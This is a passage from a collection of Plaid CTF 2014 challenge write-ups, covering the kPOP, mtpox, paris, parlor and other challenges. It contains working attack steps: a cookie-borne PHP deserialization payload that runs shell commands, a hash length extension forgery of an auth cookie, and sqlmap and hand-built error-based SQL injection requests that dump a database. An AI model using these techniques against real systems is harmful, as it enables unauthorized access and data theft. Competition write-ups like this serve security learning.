$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'file /home/flag/flag' | head -n1)" 'http://54.234.123.205/import.php'
/home/flag/flag: ASCII text
<html>
…
```

Surprise — it’s a plain text file! Who knew?! Let’s view its contents:

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'file /home/flag/flag' | head -n1)" 'http://54.234.123.205/import.php'
One_of_our_favorite_songs_is_bubble_pop
<html>
…
```

The flag is `One_of_our_favorite_songs_is_bubble_pop`.

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-200-kpop-bad-deserialization>
* <http://akaminsky.net/plaidctf-quals-2014-web-200-kpop/>
* [Solution in PHP by @manhluat93](https://gist.github.com/anonymous/31bfc4eea34fb213e4bc)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/kPOP)

# Plaid CTF 2014: moscow

**Category:** Reversing
**Points:** 250
**Description:**

> While searching for The Plague and the Prime Factorizer, you come across [this program](moscow-f76df876f9309359185541528ae0d923.tar.bz2). It is so fiendish it must have something to do with your quest.

## Write-up

(TODO)

## Other write-ups

* none yet

# Plaid CTF 2014: mtpox

**Category:** Web
**Points:** 150
**Description:**

> The Plague has traveled back in time to create a cryptocurrency before Satoshi does in an attempt to quickly gain the resources required for his empire. As you step out of your time machine, you learn [his exchange](http://54.211.6.40/) has stopped trades, due to some sort of bug. However, if you could break into the database and show a different story of where the coins went, we might be able to stop The Plague.
>
> Hint: try reading things using `?page=`.

## Write-up

### Source code disclosure vulnerability

The “Index” link on the website points to [`/index.php?page=index`](http://54.211.6.40/). Playing around with that URL query string parameter reveals that the site is vulnerable to source code disclosure. We exploit this vulnerability to get the source code for [`index.php`](index.php) (via [`/index.php?page=index.php`](http://54.211.6.40/index.php?page=index.php)) and [`admin.php`](admin.php) (via [`/index.php?page=admin.php`](http://54.211.6.40/index.php?page=admin.php)).

### Hash length extension vulnerability

Reading through the source code, we learn that [`admin.php`](admin.php) has some authentication logic:

```php
$auth = false;
if (isset($_COOKIE["auth"])) {
   $auth = unserialize($_COOKIE["auth"]);
   $hsh = $_COOKIE["hsh"];
   if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
     $auth = false;
   }
}
else {
  $auth = false;
  $s = serialize($auth);
  setcookie("auth", $s);
  setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
}
```

Let’s focus on the `else` clause for now, i.e. the code that is executed the first time you visit the site (without a cookie):

```php
$auth = false;
$s = serialize($auth);
setcookie("auth", $s);
setcookie("hsh", hash("sha256", $SECRET . strrev($s)));
```

So, the value of the `auth` cookie is `serialize(false)`, and the value of the `hsh` cookie acts as a signature for it. The cookie values for any logged out users are:

```
auth=b%3A0%3B
hsh=ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3
```

The value for `auth` makes sense, because in PHP, `false` serializes to 'b:0;`, and `true` serializes to `b:1;`:

```bash
$ php -r 'echo serialize(false);'
b:0;

$ php -r 'echo serialize(true);'
b:1;
```

We cannot simply change the value of the `auth` cookie from `b:0;` to `b:1;` to gain administrator rights, because the `hsh` cookie is used as a signature check. If the signature in `hsh` doesn’t match the `auth` value, we’re still not logged in.

After reading the source code more closely, we learn that the site is vulnerable to [hash length extension attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks). Here’s the vulnerable code in [`admin.php`](admin.php):

```php
if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
  $auth = false;
}
```

In general, an application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

Since `$_COOKIE["auth"]` and thus `strrev($_COOKIE["auth"])` are values under our control, we can use a hash length extension attack to append data to `strrev($_COOKIE["auth"])` so that `$SECRET . strrev($_COOKIE["auth"]))` generates a new hash that still matches the unknown prefix `$SECRET`. That hash can then be used as the value for the `hsh` cookie.

So, starting with the existing value for `strrev($_COOKIE["auth"])` (for which we know the signature hash), i.e. `;0:b`, what data should we append? We want to make it so that the value of the cookie is interpreted as `b:1;`, which reverses into `;1:b`.

Let’s use [HashPump](https://github.com/bwall/HashPump) to calculate the new signature. [The about page](http://54.211.6.40/index.php?page=about.php) reveals that `length($secret)` is `8`, but if we didn’t know that, we could still ‘bruteforce’ it by trying all key lengths from `1` to `32`.

```bash
$ hashpump --keylength 8 --signature 'ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3' --data ';0:b' --additional ';1:b'
967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
;0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b
```

Now we have a new signature hash (`967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1`) to be used as the value for the `hsh` cookie, and the new value on which the hash is based (i.e. `strrev($_COOKIE["auth"]`) along with the `$SECRET` prefix. In order to get the `auth` cookie value, we still need to reverse and URL-encode this result:

```bash
$ node
> var data = ';0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b';
> console.log(encodeURIComponent(data.split('').reverse().join('')));
b%3A1%3B%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%80b%3A0%3B
```

Just to be sure, let’s verify that this value `unserialize`s to `true` instead of `false`:

```bash
$ php -r 'var_dump(unserialize(strrev(";0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b")));'
bool(true)
```

Looking good. Now, let’s use these cookie values and reload `admin.php`:

```
auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b
hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
```

And we’re successfully logged in!

### SQL injection vulnerability

The `query` URL parameter for [`/admin.php`](http://54.211.6.40/admin.php?query=lol) is vulnerable to SQL injection. Let’s see what kind of data we can leak using [`sqlmap`](http://sqlmap.org/):

```bash
$ sqlmap.py -u 'http://54.211.6.40/admin.php?query=abc' --cookie='auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' --dump-all

    sqlmap/0.9 - automatic SQL injection and database takeover tool
    http://sqlmap.sourceforge.net

[*] starting at: 13:33:37

[13:33:37] [INFO] using '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/session' as session file
[13:33:37] [INFO] testing connection to the target url
[13:33:37] [INFO] testing if the url is stable, wait a few seconds
[13:33:37] [INFO] url is stable
[13:33:37] [INFO] testing if GET parameter 'query' is dynamic
[13:33:37] [INFO] confirming that GET parameter 'query' is dynamic
[13:33:37] [INFO] GET parameter 'query' is dynamic
[13:33:37] [INFO] heuristic test shows that GET parameter 'query' might be injectable (possible DBMS: MySQL)
[13:33:37] [INFO] testing sql injection on GET parameter 'query'
[13:33:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:33:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[13:33:37] [INFO] GET parameter 'query' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
[13:33:37] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:33:37] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[13:33:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[13:33:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
GET parameter 'query' is vulnerable. Do you want to keep testing the others? [y/N] y
sqlmap identified the following injection points with a total of 33 HTTP(s) requests:
---
Place: GET
Parameter: query
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: query=abc AND (SELECT 1000 FROM(SELECT COUNT(*),CONCAT(CHAR(58,98,119,100,58),(SELECT (CASE WHEN (1000=1000) THEN 1 ELSE 0 END)),CHAR(58,108,110,101,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
---

[13:33:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian or Ubuntu
web application technology: Apache 2.2.22, PHP 5.4.4
back-end DBMS: MySQL 5.0
[13:33:37] [INFO] sqlmap will dump entries of all databases' tables now
[13:33:37] [INFO] fetching tables
[13:33:37] [INFO] fetching database names
[13:33:37] [INFO] the SQL query used returns 2 entries
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: mtpox
[13:33:37] [INFO] the SQL query used returns 41 entries
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: CHARACTER_SETS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLLATIONS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLLATION_CHARACTER_SET_APPLICABILITY
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLUMNS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: COLUMN_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: ENGINES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: EVENTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: FILES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: GLOBAL_STATUS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: GLOBAL_VARIABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: KEY_COLUMN_USAGE
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PARAMETERS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PARTITIONS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PLUGINS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PROCESSLIST
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: PROFILING
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: REFERENTIAL_CONSTRAINTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: ROUTINES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SCHEMATA
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SCHEMA_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SESSION_STATUS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: SESSION_VARIABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: STATISTICS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLESPACES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLE_CONSTRAINTS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TABLE_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: TRIGGERS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: USER_PRIVILEGES
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: VIEWS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_PAGE
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_TRX
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_POOL_STATS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_LOCK_WAITS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMPMEM
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMP
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_LOCKS
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMPMEM_RESET
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_CMP_RESET
[13:33:37] [INFO] retrieved: information_schema
[13:33:37] [INFO] retrieved: INNODB_BUFFER_PAGE_LRU
[13:33:37] [INFO] retrieved: mtpox
[13:33:37] [INFO] retrieved: plaidcoin_wallets
[13:33:37] [INFO] fetching columns for table 'plaidcoin_wallets' on database 'mtpox'
[13:33:37] [INFO] the SQL query used returns 2 entries
[13:33:37] [INFO] retrieved: id
[13:33:37] [INFO] retrieved: varchar(40)
[13:33:37] [INFO] retrieved: amount
[13:33:37] [INFO] retrieved: int(30)
[13:33:37] [INFO] fetching entries for table 'plaidcoin_wallets' on database 'mtpox'
[13:33:37] [INFO] the SQL query used returns 1 entries
[13:33:37] [INFO] retrieved: 1333337
[13:33:37] [INFO] retrieved: flag{phpPhPphpPPPphpcoin}
Database: mtpox
Table: plaidcoin_wallets
[1 entry]
+---------+---------------------------+
| amount  | id                        |
+---------+---------------------------+
| 1333337 | flag{phpPhPphpPPPphpcoin} |
+---------+---------------------------+

[13:33:37] [INFO] Table 'mtpox.plaidcoin_wallets' dumped to CSV file '/usr/local/Cellar/sqlmap/0.9/output/54.211.6.40/dump/mtpox/plaidcoin_wallets.csv'
[13:33:37] [INFO] fetching columns for table 'CHARACTER_SETS' on database 'information_schema'
[13:33:37] [INFO] the SQL query used returns 4 entries
[13:33:37] [INFO] retrieved: CHARACTER_SET_NAME
…
```

The flag is `flag{phpPhPphpPPPphpcoin}`.

For the record, the payload `sqlmap` used to get the flag was:

```bash
$ curl --cookie 'auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' 'http://54.211.6.40/admin.php?query=abc%20AND%20%28SELECT%203497%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%28CHAR%2858%2C103%2C99%2C121%2C58%29%2C%28SELECT%20MID%28%28IFNULL%28CAST%28id%20AS%20CHAR%29%2CCHAR%2832%29%29%29%2C1%2C50%29%20FROM%20mtpox.plaidcoin_wallets%20LIMIT%200%2C1%29%2CCHAR%2858%2C118%2C117%2C112%2C58%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29'
Query failed: Duplicate entry ':gcy:flag{phpPhPphpPPPphpcoin}:vup:1' for key 'group_key'
```

## Other write-ups and resources

* <http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/>
* <https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack>
* <http://achatz.me/plaid-ctf-mt-pox/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/mtpox)

# Plaid CTF 2014: multiplication is hard

**Category:** Misc
**Points:** 10
**Description:**

> The Plague went back in time... but we haven't yet figured out what he did this time... Anyway, what is 38.55 * 1700?

## Write-up

Mathematically, `38.55 * 1700 = 65535` but that solution was not accepted.

Years ago (“back in time”), [Excel used to have a bug](http://blogs.office.com/2007/09/25/calculation-issue-update/) where calculations that resulted in a number close to 65,535 would instead show a result of 100,000.

The flag is `100000`.

## Other write-ups

* none yet

# Plaid CTF 2014: __nightmares__

**Category:** Pwnables
**Points:** 375
**Description:**

> The Plague is building an army of evil hackers, and they are starting off by teaching them python with this simple service. Maybe if you could get full access to [this system](__nightmares__-0873934805b8f0c0c38eeae6db5fc1e8.tar.bz2), at 54.196.37.47:9990, you would be able to find out more about The Plague's evil plans.

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by Martin Heistermann](http://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/)
* [Write-up by More Smoked Leet Chicken](http://mslc.ctf.su/wp/plaidctf-2014-__nightmares__-writeup/)
* [Write-up by fail0verflow](https://fail0verflow.com/blog/2014/plaidctf2014-pwn375-__nightmares__.html)
* [Solution by the Pwnies team](https://gist.github.com/IdolfHatler/8ba6f93472b3834d00c7)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/__nightmares__)

# Plaid CTF 2014: paris

**Category:** Reversing
**Points:** 300
**Description:**

> [This binary](paris-20b542bf824d8d0daf240bbf3febbce0.tar.bz2) was found on some of our Windows machines. It's got The Plague written all over it. What secrets are contained inside?

## Write-up

The binary is a password crackme. It uses a VM with 20 different opcodes for obfuscating the password checking algorithm. The VM does some peculiar things however.

We need to find a password such that ESI has the value `0xdeadbeef` after `process_password` gets called:

```nasm
.text:00401056 call    process_password
.text:0040105B push    0FFFFFFF5h                      ; nStdHandle
.text:0040105D call    ds:GetStdHandle
.text:00401063 push    0
.text:00401065 push    offset NumberOfCharsWritten
.text:0040106A cmp     esi, 0DEADBEEFh
.text:00401070 jnz     try_again
```

Looking at `process_password` each attempt to decode a VM instruction also generates an exception:

```nasm
.text:00402066 process_password proc near
.text:00402066 xor     ecx, ecx
.text:00402068
.text:00402068 loop_vm:
.text:00402068 push    offset seh_handler
.text:0040206D push    large dword ptr fs:0
.text:00402074 mov     large fs:0, esp
.text:0040207B mov     eax, 0
.text:00402080 mov     [eax], eax                      ; jump to seh_handler
.text:00402082 sub     edi, 1111h                      ; also important
.text:00402088 pop     large dword ptr fs:0
.text:0040208F add     esp, 4
.text:00402092 cmp     vm_done_flag, 1
.text:00402099 jz      vm_done
.text:0040209F jmp     short loop_vm
.text:0040209F process_password endp
```

It seems the SEH handler is actually responsible for decoding the instructions. Also, note the `sub edi, 1111h` which will be important later.

Looking at the SEH handler:

```nasm
.text:00402376 seh_handler:
.text:00402376 movzx   eax, byte ptr vm_current_opcode_dispatch
.text:0040237D add     eax, offset vm_opcode_dispatch
.text:00402382 mov     eax, [eax]
.text:00402384 add     byte ptr vm_current_opcode_dispatch, 4
.text:0040238B cmp     byte ptr vm_current_opcode_dispatch, 50h
.text:00402392 jl      short loc_40239B
.text:00402394 mov     byte ptr vm_current_opcode_dispatch, 0
.text:0040239B
.text:0040239B loc_40239B:
.text:0040239B jmp     eax
```

It doesn’t seem to do anything too special. It just loops through an array of functions for each exception that gets generated.

Looking at the function array:

```nasm
.text:0040220E vm_opcode_dispatch dd offset vm_0_nop
.text:00402212 dd offset vm_201_mov_r_r
.text:00402216 dd offset vm_202_mov_r_r
.text:0040221A dd offset vm_203_mov_r_mem_r_
.text:0040221E dd offset vm_13_mov_r_imm16
.text:00402222 dd offset vm_98_add_r_r
.text:00402226 dd offset vm_99_sub_r_r
.text:0040222A dd offset vm_9a_xor_r_r
.text:0040222E dd offset vm_9b_and_r_r
.text:00402232 dd offset vm_9_shr_r_8
.text:00402236 dd offset vm_15_not_r
.text:0040223A dd offset vm_2_inc_r
.text:0040223E dd offset vm_3f_cmp_r_r
.text:00402242 dd offset vm_1f_jmp_imm
.text:00402246 dd offset vm_1d_jz_imm
.text:0040224A dd offset vm_7_push_r
.text:0040224E dd offset vm_18_pop_r
.text:00402252 dd offset vm_1b_bswap_r
.text:00402256 dd offset vm_0a_xor_decrypt      ;; "unorthodox" instruction (XORs 200h bytes)
.text:0040225A dd offset vm_14_done
```

Looking at some of the handlers, some patterns emerge. There are three helper functions used in the instruction handlers:

1. `00401CF0 vm_1byte_instruction_ebx`
2. `00401D19 vm_2byte_instruction_ebx_ecx`
3. `00401D50 vm_3byte_instruction_ebx_ecx`

Each of these functions reads in the next bytes in the code stream and returns the decode opcode in `eax` and operands in `ebx` and `ecx`.

Another peculiar thing is that each instruction handler will subtract a value (the opcode) from `eax` and `setz al` before jumping to this code:

```nasm
.text:00401FCA mov     edx, [esp+arg_8]
.text:00401FCE cmp     al, 1
.text:00401FD0 jz      inc_eh_ret_by_2
.text:00401FD6 mov     esi, offset vm_copy_of_host_cpu_registers
.text:00401FDB mov     edi, edx
.text:00401FDD mov     ecx, 34h
.text:00401FE2 rep movsd
.text:00401FE4 mov     esi, offset vm_copy_of_password_buff
.text:00401FE9 mov     edi, offset password_buff       ; "V1rTu4L_M"
.text:00401FEE mov     ecx, 100h
.text:00401FF3 rep movsd
.text:00401FF5 mov     esi, 401890h
.text:00401FFA mov     edi, offset vm_unknown_input
.text:00401FFF mov     ecx, 80h
.text:00402004 rep movsd
.text:00402006 mov     al, byte_4024AB
.text:0040200B mov     vm_zf, al
.text:00402010 mov     al, initial_vm_done_flag
.text:00402015 mov     vm_done_flag, al
.text:0040201A mov     ax, vm_ip_copy
.text:00402020 mov     vm_ip, ax
.text:00402026 mov     ax, vm_sp_copy
.text:0040202C mov     vm_sp, ax
.text:00402032 jmp     inc_eh_ret_by_2
```

That checks if `al` is `1` (i.e. if `setz al` set it to `1`). If `al` was not set to `1`, it reverts the VM to the state before executing that instruction. This is probably the weirdest thing about this VM, it checks and runs the VM code and reverts if it later figures out that it wasn’t the proper opcode for the instruction it just executed.

The VM registers seem to be kept at `[esp+0Ch]+9ch`. This is all running inside a SEH handler and `[esp+0Ch]` points to the CONTEXT struct which contains (among other things) the register state when the exception occured. At offset `9ch` in the CONTEXT struct you have the EDI register. Based on the instruction handlers and the 3 helper functions the VM seems to be all 16-bit and has 3 bits for register encoding in the instructions (that means 8 general purpose registers in total). So `r0`-`r7` (VM registers) seem to be overlayed on top of EDI, ESI, EBX, EDX. Now, remember the `sub edi, 1111h` happening for each instruction decoded? That’s going to change `r0` and `r1` inside the VM (ouch) each time an attempt to decode an opcode is made.

Note: This is the long way (my way) of doing this, you can probably put a conditional breakpoint right after the call to one of the three helper functions and check if `eax` has the proper opcode value and trace.

I wrote [a simple script](disasm.py) to disassemble all the VM code and then formatted it to something more pleasant (I tend to like static analysis better). This resulted in:

```nasm
[0000] nop
[0001] nop
[0002] nop
[0003] mov r2, 0x3133
[0006] mov r3, 0x0
[0009] mov r4, 0xff00
[000c] mov r5, 0xff
loop_mem:
  [000f] mov r0, word [r3]    ;; actually r0 = [r3] - 3332h, because of sub edi, 1111h and the loopy behavior
  [0011] mov r7, r0
  [0013] bswap r7
  [0014] not r7
  [0015] cmp r7, r2
  [0017] jz loop_mem_exit
  [001a] mov r6, r7
  [001c] and r6, r4
  ;; r7 = word[r3] & 0xff
  [001e] and r7, r5
  ;; r6 = word[r3] & 0xff00 >> 8
  [0020] shr r6, 8
  [0021] xor r7, r6
  ;; r6 = 0x200
  [0023] mov r6, 0x200
  [0026] add r7, r7
  [0028] add r6, r7
  [002a] mov r7, word [r6]
  [002c] bswap r7
  [002d] pop r6
  [002e] xor r7, r6
  [0030] push r6
  [0031] push r7
  [0032] xor200h r3
  [0033] inc r3
[0034] jmp loop_mem
loop_mem_exit:
;; r7 = 0
;; r2 = 0x100
;; r6 = 0xaf21
[0037] xor r7, r7
[0039] mov r2, 0x100
[003c] mov r6, 0xaf21
loop_stack:
  [003f] mov r5, word [r2]
  [0041] bswap r5
  [0042] inc r2
  [0043] inc r2
  [0044] pop r3    ;; need to pop 0x5a4d here before r5 == 0xaf21, stack also needs to be aligned after that pop
  [0045] cmp r5, r6
  [0047] jz good_boy
  [004a] cmp r5, r3
  [004c] jz loop_stack
[004f] mov r3, 0x0
[0052] mov r2, 0x0
[0055] done
good_boy:
[0056] mov r5, 0x5a4d
[0059] cmp r3, r5    ;; r3 needs to be 0x5a4d
[005b] jz good_boy_final
[005e] mov r3, 0x0
[0061] mov r2, 0x0
[0064] done
good_boy_final:
[0065] mov r3, 0xdead   ;; r2 and r3 overlay on top of ESI which we want to be set to 0xdeadbeef
[0068] mov r2, 0xbeef
```

The base of memory seems to be where the password read from the keyboard is stored (`00401490`). What the VM code appears to be doing is pushing some values to the stack in the first loop and in the second loop it compares the stack with the values at `MEM_100h`. Also note the use of `r0` which gets changed in each attempt to decode an instruction.

And this (in reverse) is what the stack should look like:

```nasm
.text:00401590 dw 2E0Bh
.text:00401592 dw 6D02h
.text:00401594 dw 7492h
.text:00401596 dw 870Ch
.text:00401598 dw 93B9h
.text:0040159A dw 0EDB3h
.text:0040159C dw 312Ch
.text:0040159E dw 7107h
.text:004015A0 dw 7D10h
.text:004015A2 dw 2007h
.text:004015A4 dw 0E7C6h
.text:004015A6 dw 3A1Bh
.text:004015A8 dw 0BAD8h
.text:004015AA dw 9417h
.text:004015AC dw 0FA6Bh
.text:004015AE dw 0BE6Ch
.text:004015B0 dw 621Dh
.text:004015B2 dw 4D3Bh
.text:004015B4 dw 47ADh
.text:004015B6 dw 7A7Ah
.text:004015B8 dw 3E9Dh
.text:004015BA dw 53A2h
.text:004015BC dw 0F22Fh
.text:004015BE dw 0D1A9h
.text:004015C0 dw 0F574h
.text:004015C2 dw 8173h
.text:004015C4 dw 11BCh
.text:004015C6 dw 0AE15h
.text:004015C8 dw 6179h
.text:004015CA dw 0AF21h    ;; this actually needs to be 0x5a4d which is already the top of the stack
```

So we need to find a password for which each adjacent two characters with the `sub` and `xor` will point to an index in `MEM_200h` where a uint16 is found that when XORed with the top of the stack should yield the next value from the array at `MEM_100h`. *gasp*

Note: There may be a nicer way of doing this next thing (compared to what I did) but it took me a while to figure out the importance of `sub edi, 1111h` and I was a bit paranoid that subtracting `3332h` would make the guessing more complicated due to carry between high and low bytes. I imagine you can roll `MEM_200h` to the last iteration and check the last value and unroll `MEM_200h` and check the second value and maybe that would be easier.

So, what I did was bruteforce all possible candidate pairs of “printable” characters for each word that needs to be on the stack and then combine them in sequence to get the flag. My script is named [`messy.py`](messy.py). Run it as follows:

```bash
$ python messy.py
```

Among the things my messy script produced was:

```nasm
('V', ('1', ('r', ('T', ('u', ('4', ('L', ('_', ('M', ('4', ('c', ('h', ('1', ('n', ('3', ('s', ('_', ('4', ('r', ('3',
('_', ('A', ('w', ('3', ('s', ('0', ('m', ('3', None))))))))))))))))))))))))))))
```

Well, it was missing the last `!` character, but meh. The flag was `V1rTu4L_M4ch1n3s_4r3_Aw3s0m3!`.

## Other write-ups

* <http://idabook.com/paris_writeup.txt> by Chris Eagle
* <https://fail0verflow.com/blog/2014/plaidctf2014-re300-paris.html>
* <http://piggybird.net/2014/04/plaidctf-2014-reversing-300-paris/>

# Plaid CTF 2014: parlor

**Category:** Crypto
**Points:** 250
**Description:**

> The Plague is running a betting service to build up funds for his massive empire. Can you figure out a way to beat the house?
>
> The service is running at 54.197.195.247:4321.

## Write-up

```bash
$ nc 54.197.195.247 4321
/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here's how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If md5(our number + your number) % odds == 0, you win bet amount*odds.       |
| UPDATE: IF YOU DIDN'T REALIZE IT, WE DO INCLUDE A NEWLINE AT THE END OF YOUR |
| NUMBER. SORRY FOR THE INCONVENIENCE. THANK YOU FOR USING PARLOR              |
| Otherwise, we get your money! We're even so nice, we gave you $1000 to start.|
|                                                                              |
| If you don't trust us, we will generate a new nonce, and reveal the old nonce|
| to you, so you can verify all of our results!                                |
|                                                                              |
| (Oh, and if you win a billion dollars, we'll give you a flag.)               |
\______________________________________________________________________________/

====================
  1) set your odds
  2) set your bet
  3) play a round
  4) get balance
  5) reveal nonce
  6) quit
====================
```

(TODO)

## Other write-ups

* <http://blog.mheistermann.de/2014/04/14/plaidctf-2014-parlor-crypto-250-writeup/>
* <http://mslc.ctf.su/wp/plaidctf-2014-parlor-writeup/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-crypto250-parlor.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/parlor)

# Plaid CTF 2014: PolygonShifter

**Category:** Web
**Points:** 100
**Description:**

> The Plague has purchased the newest invention, _Polygon Shifter_ to protect his website. This cutting edge technology is made available by Polygon Security, and they have a demo page on their [website](http://54.204.80.192/). They claim bots can no longer attack the website protected by the Polygon Shifter. Do we need to manually bruteforce the credentials?

## Write-up

Looking into the source code, we learn that there is a ‘secret’ admin account:

```html
